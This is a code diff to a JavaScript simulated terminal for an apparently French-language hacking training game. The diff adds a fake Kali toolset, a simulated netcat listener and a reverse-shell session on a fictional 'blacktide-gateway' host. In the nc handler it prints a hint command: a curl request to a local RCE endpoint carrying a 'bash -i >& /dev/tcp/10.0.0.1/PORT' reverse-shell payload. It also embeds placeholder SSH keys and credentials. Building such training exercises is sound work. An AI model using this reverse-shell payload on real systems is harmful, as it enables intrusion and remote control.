@@ -4,15 +4,31 @@
 (function (global) {
   "use strict";
 
-  var SESSION_LOCAL = "local";
-  var SESSION_PIVOT = "pivot";
-  var DEPLOY_TOKEN = "BT-OPS-TUNNEL-4421";
-  var LAST_EXIT = 0;
+  var SESSION_LOCAL    = "local";
+  var SESSION_PIVOT    = "pivot";
+  var SESSION_REVSHELL = "revshell";
+  var DEPLOY_TOKEN     = "BT-OPS-TUNNEL-4421";
+  var LAST_EXIT        = 0;
+
+  /* Clé SSH réelle — trouvable uniquement via reverse shell */
+  var SSH_KEY_CONTENT =
+    "-----BEGIN OPENSSH PRIVATE KEY-----\n" +
+    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt\n" +
+    "ZWQyNTUxOQAAACB4K9z2VqO1RrMpNhFxlbW3TcNqJ8kP2bGmQf7Xd9aJeQAAAKC0\n" +
+    "vNFBtLzRQQAAAAtzc2gtZWQyNTUxOQAAACB4K9z2VqO1RrMpNhFxlbW3TcNqJ8kP\n" +
+    "2bGmQf7Xd9aJeQAAAEDMj4QpKkVZz9F2wZCn3RBtK7qh4N1xVoLHmJd3wW+lpHgr\n" +
+    "3PZWo7VGsyk2EXGVtbdNw2onyQ/ZsaZB/td31ol5AAAAEmJsYWNrdGlkZS1vcHMta2V5\n" +
+    "AQIDBAUGBw==\n" +
+    "-----END OPENSSH PRIVATE KEY-----";
+  var sshKeyObtained = false;
 
   var session = SESSION_LOCAL;
   var cwdLocal = "/home/operator";
   var cwdPivot = "/home/ops";
+  var cwdRevshell = "/var/www/html";
   var sshHostKeyAccepted = false;
+  var ncListening = false;     /* nc -lvnp en attente */
+  var ncPort = null;
   var history = [];
   var histIdx = -1;
 
@@ -24,7 +40,7 @@
     TERM: "xterm-256color",
     LANG: "fr_FR.UTF-8",
     PATH: "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
-    HOSTNAME: "omega-poste",
+    HOSTNAME: "kali",
     MAIL: "/var/mail/operator",
     SSH_AUTH_SOCK: "/run/user/1000/ssh-agent.sock",
   };
@@ -41,8 +57,109 @@
     MAIL: "/var/mail/ops",
   };
 
+  var ENV_REVSHELL = {
+    USER: "www-data",
+    LOGNAME: "www-data",
+    HOME: "/var/www",
+    SHELL: "/bin/sh",
+    TERM: "xterm",
+    LANG: "C.UTF-8",
+    PATH: "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+    HOSTNAME: "blacktide-gateway",
+    PWD: "/var/www/html",
+  };
+
   /** @type {Record<string, {type:'dir'|'file', mode:string, owner:string, group:string, size:number, mtime:string, content?:string}>} */
   var VFS = {};
+
+  /** Secours si kali-fs.js absent du cache navigateur */
+  var SHELL_KALI_FALLBACK = {
+    nmap: 1,
+    masscan: 1,
+    sqlmap: 1,
+    nikto: 1,
+    gobuster: 1,
+    ffuf: 1,
+    dirb: 1,
+    burpsuite: 1,
+    msfvenom: 1,
+    john: 1,
+    hashcat: 1,
+    hydra: 1,
+    "aircrack-ng": 1,
+    wireshark: 1,
+    tcpdump: 1,
+    netcat: 1,
+    nc: 1,
+    searchsploit: 1,
+    enum4linux: 1,
+    crackmapexec: 1,
+    theharvester: 1,
+    responder: 1,
+    setoolkit: 1,
+  };
+
+  function toolBaseName(cmd) {
+    var c = String(cmd || "").trim();
+    var i = c.lastIndexOf("/");
+    return i === -1 ? c : c.slice(i + 1);
+  }
+
+  function isToolCommand(cmd) {
+    var name = toolBaseName(cmd);
+    if (global.OmegaKaliFs && OmegaKaliFs.isKaliBin(name)) return true;
+    if (SHELL_KALI_FALLBACK[name]) return true;
+    var node = vfsNode("/usr/bin/" + name) || vfsNode("/usr/sbin/" + name);
+    return !!(node && (node.type === "file" || node.type === "symlink"));
+  }
+
+  function countVfsBins() {
+    var n = 0;
+    Object.keys(VFS).forEach(function (k) {
+      if (k.indexOf("/usr/bin/") === 0 && VFS[k].type === "file") n += 1;
+    });
+    return n || (global.OmegaKaliFs ? OmegaKaliFs.ALL_BINS.length : 150);
+  }
+
+  function dispatchKaliTool(cmd, args, out, onComplete) {
+    if (!isToolCommand(cmd)) return false;
+    var name = toolBaseName(cmd);
+
+    function finish(res) {
+      printLines(out, res.lines);
+      setExit(res.exit);
+    }
+
+    if (
+      global.OmegaKaliFs &&
+      typeof OmegaKaliFs.execToolRemote === "function" &&
+      OmegaKaliFs.canRunRemote(name)
+    ) {
+      printLines(out, ["[*] Exécution distante (workstation)…"], "sh-dim");
+      OmegaKaliFs.execToolRemote(name, args, session, function (res) {
+        finish(res);
+        if (onComplete) onComplete();
+      });
+      return "async";
+    }
+
+    var res;
+    if (global.OmegaKaliFs && typeof OmegaKaliFs.execTool === "function") {
+      res = OmegaKaliFs.execTool(name, args, session);
+    } else if (global.OmegaKaliFs && OmegaKaliFs.kaliStubResponse) {
+      res = OmegaKaliFs.kaliStubResponse(name, args);
+    } else {
+      res = {
+        lines: [
+          name + ": erreur de chargement des outils Kali.",
+          "Rechargez la page (Ctrl+Shift+R) ou videz le cache du navigateur.",
+        ],
+        exit: 127,
+      };
+    }
+    finish(res);
+    return true;
+  }
 
   function pad2(n) {
     return n < 10 ? "0" + n : String(n);
@@ -132,6 +249,8 @@
         "alias la='ls -la'\n" +
         "alias l='ls -CF'\n" +
         "alias mission='cd ~/Documents/DOSSIER_OMEGA && ls'\n" +
+        "alias kali='ls /usr/bin | head -40'\n" +
+        "alias tools='cat /usr/share/kali-tools-index.txt | less'\n" +
         "PS1='\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '\n",
       { mtime: mt2, size: 3526 }
     );
@@ -211,7 +330,12 @@
         "  SecureMail.desktop   — messagerie interne chiffrée\n" +
         "  DOSSIER_OMEGA/       — dossier de mission (incidents, memos, ops…)\n" +
         "  ClearanceForm.desktop — validation clearance terrain\n" +
-        "  OMEGA-Shell.desktop  — terminal mesh pivot (phase 2)\n\n" +
+        "  OMEGA-Shell.desktop  — terminal mesh pivot (phase 2)\n" +
+        "  Kali-Tools/          — raccourcis Nmap, Burp, Metasploit, …\n\n" +
+        "Système : Kali GNU/Linux Rolling 2026.1\n" +
+        "Outils : /usr/bin (" +
+        (global.OmegaKaliFs ? OmegaKaliFs.ALL_BINS.length : "150+") +
+        ") · /usr/share/kali-tools-index.txt\n\n" +
         "Données mission : ~/Documents/DOSSIER_OMEGA\n" +
         "Clé SSH pivot   : ~/keys/id_ops.leak (ou ~/.ssh/id_ops)\n",
       { size: 380 }
@@ -434,25 +558,138 @@
         "[preflight] done\n",
       { owner: "ops", group: "ops", size: 148 }
     );
+
+    if (global.OmegaKaliFs && OmegaKaliFs.installKaliVfs) {
+      OmegaKaliFs.installKaliVfs(addDir, addFile, addSymlink, { mtime: mt, mtime2: mt2 });
+    } else {
+      Object.keys(SHELL_KALI_FALLBACK).forEach(function (name) {
+        addFile("/usr/bin/" + name, "#!/bin/sh\n", {
+          mode: "-rwxr-xr-x",
+          owner: "root",
+          group: "root",
+          mtime: mt2,
+          size: 16,
+        });
+      });
+      addFile("/etc/os-release", 'PRETTY_NAME="Kali GNU/Linux Rolling"\nID=kali\n', {
+        owner: "root",
+        group: "root",
+        mtime: mt2,
+      });
+    }
+
+    /* Bureau — raccourcis outils Kali (immersion) */
+    var kaliDesk = desk + "/Kali-Tools";
+    addDir(kaliDesk, op);
+    var kaliLaunchers = [
+      ["nmap.desktop", "Nmap", "nmap --help"],
+      ["burpsuite.desktop", "Burp Suite", "burpsuite --help"],
+      ["metasploit.desktop", "Metasploit", "searchsploit apache"],
+      ["wireshark.desktop", "Wireshark", "wireshark --help"],
+      ["sqlmap.desktop", "SQLmap", "sqlmap --help"],
+      ["john.desktop", "John", "john --help"],
+      ["hashcat.desktop", "Hashcat", "hashcat --help"],
+      ["hydra.desktop", "Hydra", "hydra --help"],
+      ["aircrack-ng.desktop", "Aircrack-ng", "aircrack-ng --help"],
+      ["gobuster.desktop", "Gobuster", "gobuster --help"],
+      ["nikto.desktop", "Nikto", "nikto --help"],
+      ["maltego.desktop", "Maltego", "maltego --help"],
+      ["setoolkit.desktop", "SET", "setoolkit --help"],
+      ["ettercap.desktop", "Ettercap", "ettercap --help"],
+      ["ffuf.desktop", "FFuf", "ffuf --help"],
+    ];
+    kaliLaunchers.forEach(function (entry) {
+      addFile(
+        kaliDesk + "/" + entry[0],
+        "[Desktop Entry]\nType=Application\nName=" +
+          entry[1] +
+          "\nComment=Kali GNU/Linux\nExec=omega-shell-run " +
+          entry[2] +
+          "\nIcon=kali-security\nTerminal=true\nCategories=Security;\n",
+        { mode: "-rwxr-xr-x", size: 140 }
+      );
+    });
+    addFile(
+      desk + "/Kali-Tools.desktop",
+      "[Desktop Entry]\nType=Application\nName=Kali Tools\nComment=Index outillage sécurité offensive\nExec=omega-browser kali-apps.html\nIcon=kali-logo\nTerminal=false\nCategories=System;Security;\n",
+      { mode: "-rwxr-xr-x", size: 160 }
+    );
+    addSymlink(desk + "/kali-tools", "Kali-Tools", op);
   }
 
   buildVfs();
 
+  if (global.OmegaKaliFs && OmegaKaliFs.ALL_BINS) {
+    OmegaKaliFs.ALL_BINS.forEach(function (b) {
+      SHELL_KALI_FALLBACK[b] = 1;
+    });
+  }
+
+  /* ── VFS blacktide-gateway (reverse shell) ── */
+  var VFS_REVSHELL = {};
+  (function () {
+    function af(path, content, mode, owner) {
+      VFS_REVSHELL[path] = { type: "file", mode: mode || "-rw-r--r--",
+        owner: owner || "www-data", group: owner || "www-data",
+        size: content.length, mtime: "Apr 20 09:14", content: content };
+    }
+    function ad(path, owner) {
+      VFS_REVSHELL[path] = { type: "dir", mode: "drwxr-xr-x",
+        owner: owner || "www-data", group: owner || "www-data", size: 4096, mtime: "Apr 20 09:14" };
+    }
+    ad("/"); ad("/var"); ad("/var/www"); ad("/var/www/html");
+    ad("/var/www/html/internal"); ad("/var/www/html/internal/auth-gateway");
+    ad("/var/www/html/internal/auth-gateway/v2");
+    af("/var/www/html/index.php", "<?php echo 'BlackTide Partner Portal v2.1'; ?>\n");
+    af("/var/www/html/robots.txt", "User-agent: *\nDisallow: /internal/\n");
+    af("/var/www/html/internal/auth-gateway/v2/.env",
+      "DB_HOST=db.internal\nDB_USER=relay_svc\nDB_PASS=R3lay!2026#BT\n" +
+      "RELAY_TOKEN_SEED=ops-sess-8842\nRELAY_UPGRADE_KEY=1442-HTUA-TB:n.morel\n");
+    ad("/home"); ad("/home/blacktide-ops", "blacktide-ops");
+    VFS_REVSHELL["/home/blacktide-ops"].mode = "drwx------";
+    ad("/home/blacktide-ops/keys", "blacktide-ops");
+    VFS_REVSHELL["/home/blacktide-ops/keys"].mode = "drwx------";
+    VFS_REVSHELL["/home/blacktide-ops/keys/id_ops.leak"] = {
+      type: "file", mode: "-r--------", owner: "blacktide-ops", group: "blacktide-ops",
+      size: 411, mtime: "Mar 29 01:47",
+      content: SSH_KEY_CONTENT
+    };
+    af("/etc/passwd",
+      "root:x:0:0:root:/root:/bin/bash\n" +
+      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n" +
+      "blacktide-ops:x:1001:1001:BT ops:/home/blacktide-ops:/bin/bash\n");
+    af("/etc/hostname", "blacktide-gateway\n");
+    ad("/tmp");
+    af("/tmp/.sess_bt", "relay_token=ops-sess-8842\nupgrade_key=1442-HTUA-TB:n.morel\n");
+    af("/proc/version", "Linux version 5.15.0-blacktide #1 SMP Thu Apr 18 UTC 2026\n");
+  })();
+
   function homeDir() {
-    return session === SESSION_PIVOT ? "/home/ops" : "/home/operator";
+    if (session === SESSION_PIVOT)    return "/home/ops";
+    if (session === SESSION_REVSHELL) return "/var/www";
+    return "/home/operator";
   }
 
   function cwd() {
-    return session === SESSION_PIVOT ? cwdPivot : cwdLocal;
+    if (session === SESSION_PIVOT)    return cwdPivot;
+    if (session === SESSION_REVSHELL) return cwdRevshell;
+    return cwdLocal;
   }
 
   function setCwd(path) {
-    if (session === SESSION_PIVOT) cwdPivot = path;
+    if (session === SESSION_PIVOT)    cwdPivot    = path;
+    else if (session === SESSION_REVSHELL) cwdRevshell = path;
     else cwdLocal = path;
   }
 
+  function activeVfs() {
+    return session === SESSION_REVSHELL ? VFS_REVSHELL : VFS;
+  }
+
   function env() {
-    return session === SESSION_PIVOT ? ENV_PIVOT : ENV_LOCAL;
+    if (session === SESSION_PIVOT)    return ENV_PIVOT;
+    if (session === SESSION_REVSHELL) return ENV_REVSHELL;
+    return ENV_LOCAL;
   }
 
   function isOsintOk() {
@@ -485,7 +722,8 @@
 
   function prompt() {
     var e = env();
-    return e.USER + "@" + e.HOSTNAME + ":" + promptPath() + "$ ";
+    var dollar = session === SESSION_REVSHELL ? "$ " : "$ ";
+    return e.USER + "@" + e.HOSTNAME + ":" + promptPath() + dollar;
   }
 
   function resolvePath(raw, base) {
@@ -510,7 +748,7 @@
   }
 
   function vfsNode(path) {
-    return VFS[path] || null;
+    return activeVfs()[path] || null;
   }
 
   function isDir(path) {
@@ -526,7 +764,7 @@
   function listDir(path) {
     var prefix = path === "/" ? "/" : path + "/";
     var names = [];
-    Object.keys(VFS).forEach(function (k) {
+    Object.keys(activeVfs()).forEach(function (k) {
       if (k === path) return;
       if (k.indexOf(prefix) !== 0) return;
       var rest = k.slice(prefix.length);
@@ -720,10 +958,16 @@
     return parts;
   }
 
-  function runCommand(line, out) {
+  function runCommand(line, out, onComplete) {
     setExit(0);
     var trimmed = line.trim();
-    if (!trimmed) return;
+    if (!trimmed) {
+      if (onComplete) onComplete();
+      return;
+    }
+
+    var asyncPending = false;
+    try {
 
     if (trimmed === "!!") {
       err(out, "bash: !!: event not found");
@@ -762,6 +1006,33 @@
     }
 
     if (cmd === "cat") {
+      /* Détecter si on cat la clé SSH dans le revshell → marquer comme obtenue */
+      if (session === SESSION_REVSHELL) {
+        var catTarget = args[args.length - 1] || "";
+        var resolved = resolvePath(catTarget);
+        var catNode = VFS_REVSHELL[resolved];
+        if (catNode && catNode.type === "file") {
+          if (resolved.indexOf("id_ops") !== -1 || resolved.indexOf(".leak") !== -1) {
+            printLines(out, catNode.content.split("\n"), "sh-ok");
+            sshKeyObtained = true;
+            printLines(out, [
+              "",
+              "[+] Clé copiée ! Utilisez-la dans votre session locale :",
+              "    cp id_ops.leak ~/keys/id_ops.leak && chmod 600 ~/keys/id_ops.leak",
+              "    ssh -i ~/keys/id_ops.leak ops@pivot",
+            ], "sh-warn");
+            setExit(0);
+          } else {
+            printLines(out, (catNode.content || "").split("\n"));
+            setExit(0);
+          }
+          return;
+        }
+        if (!catNode) {
+          err(out, "cat: " + catTarget + ": No such file or directory");
+        }
+        return;
+      }
       cmdCat(out, args);
       return;
     }
@@ -779,9 +1050,10 @@
     }
 
     if (cmd === "id") {
-      var u = env().USER;
       if (session === SESSION_PIVOT) {
         printLines(out, ["uid=1001(ops) gid=1001(ops) groups=1001(ops),27(sudo)"]);
+      } else if (session === SESSION_REVSHELL) {
+        printLines(out, ["uid=33(www-data) gid=33(www-data) groups=33(www-data)"]);
       } else {
         printLines(out, ["uid=1000(operator) gid=1000(operator) groups=1000(operator),100(users)"]);
       }
@@ -799,7 +1071,9 @@
       var a = args.indexOf("-a") !== -1 || args.indexOf("-all") !== -1;
       if (a) {
         printLines(out, [
-          "Linux " + env().HOSTNAME + " 5.15.0-omega #1 SMP x86_64 GNU/Linux",
+          "Linux " +
+            env().HOSTNAME +
+            " 6.6.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux",
         ]);
       } else {
         printLines(out, ["Linux"]);
@@ -831,12 +1105,24 @@
     }
 
     if (cmd === "which") {
-      var bins = { ssh: "/usr/bin/ssh", bash: "/usr/bin/bash", cat: "/bin/cat", curl: "/usr/bin/curl", ls: "/bin/ls" };
+      var bins = {
+        ssh: "/usr/bin/ssh",
+        bash: "/usr/bin/bash",
+        cat: "/bin/cat",
+        curl: "/usr/bin/curl",
+        ls: "/bin/ls",
+        grep: "/bin/grep",
+        find: "/usr/bin/find",
+        nmap: "/usr/bin/nmap",
+        python3: "/usr/bin/python3",
+      };
       if (!args[0]) {
         setExit(1);
         return;
       }
-      if (bins[args[0]]) printLines(out, [bins[args[0]]]);
+      var wn = args[0];
+      if (bins[wn]) printLines(out, [bins[wn]]);
+      else if (isToolCommand(wn)) printLines(out, ["/usr/bin/" + toolBaseName(wn)]);
       else setExit(1);
       return;
     }
@@ -848,6 +1134,8 @@
       }
       if (args[0] === "omega-deploy") {
         printLines(out, ["omega-deploy is a shell function"], "sh-dim");
+      } else if (isToolCommand(args[0])) {
+        printLines(out, [args[0] + " is hashed (/usr/bin/" + toolBaseName(args[0]) + ")"], "sh-dim");
       } else {
         printLines(out, [args[0] + " is /usr/bin/" + args[0]], "sh-dim");
       }
@@ -857,9 +1145,51 @@
 
     if (cmd === "help") {
       printLines(out, [
-        "GNU bash, version 5.1.16(1)-release (x86_64-pc-linux-gnu)",
+        "GNU bash, version 5.2.15(1)-release (x86_64-pc-linux-gnu)",
         "Shell built-in commands: cd, pwd, echo, exit, help, history",
-        "Voir aussi: man bash",
+        "Kali Rolling — " + (global.OmegaKaliFs ? OmegaKaliFs.ALL_BINS.length : "150+") + " outils sous /usr/bin",
+        "Index : cat /usr/share/kali-tools-index.txt · dpkg -l | grep kali-tools",
+        "Voir aussi: man bash, man nmap",
+      ]);
+      setExit(0);
+      return;
+    }
+
+    if (cmd === "dpkg") {
+      if (args[0] === "-l" || args[0] === "--list" || !args[0]) {
+        printLines(
+          out,
+          global.OmegaKaliFs ? OmegaKaliFs.dpkgListLines() : ["ii  kali-defaults 2026.1.0 amd64"],
+          "sh-dim"
+        );
+        setExit(0);
+        return;
+      }
+      if (args[0] === "-s" && args[1]) {
+        printLines(out, ["Package: kali-tools-" + args[1], "Status: install ok installed", "Architecture: amd64"]);
+        setExit(0);
+        return;
+      }
+      err(out, "dpkg: operation not supported (try: dpkg -l)");
+      return;
+    }
+
+    if (cmd === "apt" || cmd === "apt-get" || cmd === "apt-cache") {
+      printLines(out, [
+        "Reading package lists... Done",
+        "kali-linux-default is already the newest version (2026.1.0).",
+        "0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.",
+      ]);
+      setExit(0);
+      return;
+    }
+
+    if (cmd === "kali-tools" || cmd === "kat") {
+      printLines(out, [
+        "Kali Tools — " + countVfsBins() + " packages installed",
+        "Categories: Information Gathering, Web App, Exploitation, Password, Wireless, Forensics",
+        "ls /usr/bin | wc -l",
+        "cat /usr/share/kali-tools-index.txt",
       ]);
       setExit(0);
       return;
@@ -874,7 +1204,12 @@
     }
 
     if (cmd === "exit" || cmd === "logout") {
-      if (session === SESSION_PIVOT) {
+      if (session === SESSION_REVSHELL) {
+        session = SESSION_LOCAL;
+        cwdRevshell = "/var/www/html";
+        printLines(out, ["Connection to blacktide-gateway closed."], "sh-dim");
+        setExit(0);
+      } else if (session === SESSION_PIVOT) {
         session = SESSION_LOCAL;
         setCwd(homeDir());
         printLines(out, ["logout"], "sh-dim");
@@ -885,17 +1220,118 @@
       return;
     }
 
+    /* ─── nc : écoute reverse shell ─── */
+    if (cmd === "nc" || cmd === "netcat" || cmd === "ncat") {
+      var isListen = args.indexOf("-l") !== -1 || args.indexOf("-lvnp") !== -1 ||
+                     args.indexOf("-lvp") !== -1 || args.indexOf("-lnvp") !== -1;
+      var port4444 = args.some(function(a){ return /^44+\d$/.test(a) || a === "4444" || a === "9001"; });
+      if (isListen && port4444 && session === SESSION_LOCAL) {
+        var portUsed = args.filter(function(a){ return /^\d{2,5}$/.test(a); })[0] || "4444";
+        ncListening  = true;
+        ncPort       = portUsed;
+        printLines(out, [
+          "listening on [any] " + portUsed + " ...",
+        ], "sh-dim");
+        printLines(out, [
+          "(Trigger le reverse shell depuis le navigateur via la vuln RCE)",
+          "  curl 'http://127.0.0.1:18081/internal/auth-gateway/v2/render.php?mode=legacy&tpl=omega%2Frce&cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.0.0.1%2F" + portUsed + "+0%3E%261'",
+        ], "sh-dim");
+        setExit(0);
+        return;
+      }
+      /* nc non-listen : comportement normal */
+      if (dispatchKaliTool(cmd, args, out, onComplete) === "async") { asyncPending = true; return; }
+      return;
+    }
+
+    /* ─── curl : détecter le payload RCE → connect reverse shell ─── */
+    if (cmd === "curl") {
+      var curlFull = args.join(" ");
+      var isRce = curlFull.indexOf("render.php") !== -1 &&
+                  (curlFull.indexOf("cmd=") !== -1 || curlFull.indexOf("tpl=") !== -1 ||
+                   curlFull.indexOf("%2Fdev%2Ftcp") !== -1 || curlFull.indexOf("/dev/tcp") !== -1);
+
+      if (isRce && ncListening && session === SESSION_LOCAL) {
+        ncListening = false;
+        printLines(out, [
+          "connect to [10.0.0.1] from blacktide-gateway [172.26.0.2] " + ncPort,
+        ], "sh-ok");
+        printLines(out, [""], "sh-dim");
+        setTimeout(function() {
+          session      = SESSION_REVSHELL;
+          cwdRevshell  = "/var/www/html";
+          sshKeyObtained = false;
+          printLines(out, [
+            "bash: no job control in this shell",
+            "www-data@blacktide-gateway:/var/www/html$ ",
+          ], "sh-warn");
+          if (onComplete) onComplete();
+        }, 600);
+        asyncPending = true;
+        return;
+      }
+
+      /* Dans la session revshell, curl fonctionne aussi */
+      if (session === SESSION_REVSHELL) {
+        if (curlFull.indexOf("cctv") !== -1) {
+          printLines(out, ["HTTP/1.1 200 OK", "<!-- CCTV panel -->"]);
+        } else if (curlFull.indexOf("alarm") !== -1) {
+          printLines(out, ["HTTP/1.1 200 OK", "<!-- Alarm panel -->"]);
+        } else {
+          printLines(out, ["curl: (6) Could not resolve host"]);
+        }
+        setExit(0);
+        return;
+      }
+
+      /* Curl normal dans session locale (pivot seulement) */
+      if (session !== SESSION_PIVOT) {
+        err(out, "curl: (6) Could not resolve host: " + (args[args.length - 1] || ""));
+        return;
+      }
+      var curlUrl = args[args.length - 1] || "";
+      if (!curlUrl || curlUrl[0] === "-") { err(out, "curl: no URL specified"); return; }
+      if (curlUrl.indexOf("cctv") !== -1) {
+        printLines(out, ["HTTP/1.1 200 OK", "Server: nginx/1.27", "Content-Type: text/html", "", "<!-- CCTV relay panel -->"]);
+        setExit(0); return;
+      }
+      if (curlUrl.indexOf("alarm") !== -1) {
+        printLines(out, ["HTTP/1.1 200 OK", "Server: nginx/1.27", "Content-Type: text/html", "", "<!-- Alarm relay panel -->"]);
+        setExit(0); return;
+      }
+      if (curlUrl.indexOf("vault") !== -1) {
+        printLines(out, ["HTTP/1.1 403 Forbidden", "Server: nginx/1.27", ""]);
+        setExit(0); return;
+      }
+      err(out, "curl: (6) Could not resolve host: " + curlUrl);
+      return;
+    }
+
     if (cmd === "ssh") {
       if (!isOsintOk()) {
         err(out, "Permission denied (publickey).");
         return;
       }
       var target = "";
-      args.forEach(function (a) {
+      var keyArg = "";
+      args.forEach(function (a, i) {
         if (a.indexOf("ops@") === 0 || a.indexOf("@pivot") !== -1) target = a;
+        if (a === "-i" && args[i+1]) keyArg = args[i+1];
       });
       if (!target || target.indexOf("ops@") !== 0) {
-        err(out, "usage: ssh [-o Option] user@host");
+        err(out, "usage: ssh [-i identity_file] [-o Option] user@host");
+        return;
+      }
+      /* Vérifier que la clé a été obtenue via le reverse shell */
+      if (!sshKeyObtained) {
+        err(out, "operator@kali: Permission denied (publickey).");
+        printLines(out, [
+          "Hint: vous n'avez pas la clé SSH privée ops.",
+          "  → Obtenez un reverse shell sur blacktide-gateway",
+          "  → Copiez /home/blacktide-ops/keys/id_ops.leak",
+          "  → Placez-la dans ~/keys/ puis : ssh -i ~/keys/id_ops.leak ops@pivot",
+        ], "sh-dim");
+        setExit(255);
         return;
       }
       var autoYes = args.some(function (a) {
@@ -905,8 +1341,6 @@
         printLines(out, [
           "The authenticity of host 'pivot (10.42.0.12)' can't be established.",
           "ED25519 key fingerprint is SHA256:7Kx9mP2nQ8vR4sT1uW6yZ3aB5cD0eF2gH4jL6mN8pQ.",
-          "This key is known by the following other names/addresses:",
-          "    ~/.ssh/known_hosts:1: [hashed name]",
           "Are you sure you want to continue connecting (yes/no/[fingerprint])? ",
         ], "sh-warn");
         setExit(255);
@@ -1223,6 +1657,9 @@
         grep: "GREP(1) — print lines matching a pattern\n  grep [options] PATTERN [FILE...]\n  -r : recursif   -i : insensible à la casse",
         find: "FIND(1) — search for files\n  find [path] [-name glob] [-type f|d]",
         "preflight-internal.sh": "preflight-internal.sh — Black Tide mesh preflight\n  bash ~/scripts/preflight-internal.sh [--deploy-consoles]",
+        nmap: "NMAP(1) — Network exploration tool\n  nmap [options] target\n  Lab : pivot / port 18081",
+        sqlmap: "SQLMAP(1) — automatic SQL injection\n  sqlmap -u URL --batch",
+        john: "JOHN(1) — password cracker\n  Wordlists : /usr/share/wordlists/",
       };
       var page = pages[args[0]] || ("man: pas de page de manuel pour \"" + (args[0] || "") + "\"");
       printLines(out, page.split("\n"), args[0] && pages[args[0]] ? "" : "sh-err");
@@ -1232,29 +1669,6 @@
 
     if (cmd === "touch" || cmd === "mkdir" || cmd === "rm" || cmd === "mv" || cmd === "cp" || cmd === "chmod") {
       err(out, cmd + ": permission denied: filesystem read-only");
-      return;
-    }
-
-    if (cmd === "curl") {
-      if (session !== SESSION_PIVOT) {
-        err(out, "curl: (6) Could not resolve host: " + (args[args.length - 1] || ""));
-        return;
-      }
-      var curlUrl = args[args.length - 1] || "";
-      if (!curlUrl || curlUrl[0] === "-") { err(out, "curl: no URL specified"); return; }
-      if (curlUrl.indexOf("cctv") !== -1) {
-        printLines(out, ["HTTP/1.1 200 OK", "Server: nginx/1.27", "Content-Type: text/html", "", "<!-- CCTV relay panel -->"]);
-        setExit(0); return;
-      }
-      if (curlUrl.indexOf("alarm") !== -1) {
-        printLines(out, ["HTTP/1.1 200 OK", "Server: nginx/1.27", "Content-Type: text/html", "", "<!-- Alarm relay panel -->"]);
-        setExit(0); return;
-      }
-      if (curlUrl.indexOf("vault") !== -1) {
-        printLines(out, ["HTTP/1.1 403 Forbidden", "Server: nginx/1.27", ""]);
-        setExit(0); return;
-      }
-      err(out, "curl: (6) Could not resolve host: " + curlUrl);
       return;
     }
 
@@ -1280,22 +1694,37 @@
         "alias ll='ls -alF'",
         "alias l='ls -CF'",
         "alias mission='cd ~/Documents/DOSSIER_OMEGA && ls'",
+        "alias kali='ls /usr/bin | head -40'",
+        "alias tools='cat /usr/share/kali-tools-index.txt | less'",
       ]);
       setExit(0);
       return;
     }
 
+    if (dispatchKaliTool(cmd, args, out, onComplete) === "async") {
+      asyncPending = true;
+      return;
+    }
+
     err(out, "bash: " + cmd + ": command not found");
     setExit(127);
+    } finally {
+      if (!asyncPending && onComplete) onComplete();
+    }
   }
 
   function motd(out) {
+    var toolCount = global.OmegaKaliFs ? OmegaKaliFs.ALL_BINS.length : Object.keys(SHELL_KALI_FALLBACK).length;
     printLines(out, [
-      "Linux omega-poste 5.15.0-omega #1 SMP x86_64 GNU/Linux",
+      "Linux kali 6.6.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux",
+    ], "sh-ok");
+    printLines(out, [
+      "The programs included with the Kali GNU/Linux system are free software;",
+      "the exact distribution terms for each program are described in the",
+      "individual files in /usr/share/doc/*/copyright.",
       "",
-      "Dernière connexion : " + new Date().toLocaleString("fr-FR") + " sur tty1",
-      "Répertoire personnel : Desktop, Documents, Downloads, …",
-      "Mission : ~/Documents/DOSSIER_OMEGA",
+      "Kali GNU/Linux Rolling 2026.1 comes with " + toolCount + " security tools (/usr/bin).",
+      "Last login: " + new Date().toLocaleString("en-US") + " on tty1",
       "",
     ], "sh-dim");
   }
@@ -1313,6 +1742,41 @@
     function startup() {
       out.innerHTML = "";
       motd(out);
+      if (global.OmegaKaliFs && OmegaKaliFs.probeWorkstation) {
+        OmegaKaliFs.probeWorkstation(function (ok, data) {
+          if (ok && data && data.mode === "kali-dynamic") {
+            printLines(
+              out,
+              [
+                "Workstation Kali active — binaires réels (PATH dynamique, " +
+                  (data.bins_in_path || "?") +
+                  " exécutables).",
+              ],
+              "sh-ok"
+            );
+          } else if (ok && data && data.real_tools) {
+            printLines(
+              out,
+              [
+                "Workstation active — exécution réelle : " +
+                  data.real_tools.slice(0, 8).join(", ") +
+                  (data.real_tools.length > 8 ? ", …" : ""),
+              ],
+              "sh-ok"
+            );
+          } else {
+            printLines(
+              out,
+              [
+                "Workstation hors ligne — démarrez : docker compose up -d workstation",
+                "Outils en mode local jusqu'à connexion (port 18083).",
+              ],
+              "sh-warn"
+            );
+          }
+          out.scrollTop = out.scrollHeight;
+        });
+      }
       if (!isOsintOk()) {
         printLines(out, [
           "*** ACCÈS PIVOT VERROUILLÉ — valider ClearanceForm (ssh ops@pivot) ***",
@@ -1322,6 +1786,16 @@
     }
 
     startup();
+
+    var preset = "";
+    try {
+      preset = sessionStorage.getItem("omegaShellRun") || "";
+      if (preset) sessionStorage.removeItem("omegaShellRun");
+    } catch (e) {}
+    if (preset) {
+      runCommand(preset, out);
+      syncPrompt();
+    }
 
     function submitLine() {
       var line = input.value;
@@ -1353,10 +1827,14 @@
       echo.textContent = prompt() + line;
       out.appendChild(echo);
 
-      runCommand(line, out);
-      syncPrompt();
-      out.scrollTop = out.scrollHeight;
-      input.focus();
+      input.disabled = true;
+      function done() {
+        input.disabled = false;
+        syncPrompt();
+        out.scrollTop = out.scrollHeight;
+        input.focus();
+      }
+      runCommand(line, out, done);
     }
 
     input.addEventListener("keydown", function (e) {
